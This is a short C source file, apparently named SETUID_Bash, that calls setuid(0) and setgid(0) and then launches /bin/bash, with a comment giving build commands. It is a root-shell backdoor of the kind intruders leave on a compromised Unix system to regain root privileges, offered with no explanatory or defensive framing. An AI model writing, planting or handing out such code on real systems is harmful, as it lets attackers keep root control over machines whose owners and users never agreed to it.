int main (void)
{
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
/*gcc SETUID_Bash.c -o SETUID_Bash
chmod +x SETUID_Bash*/
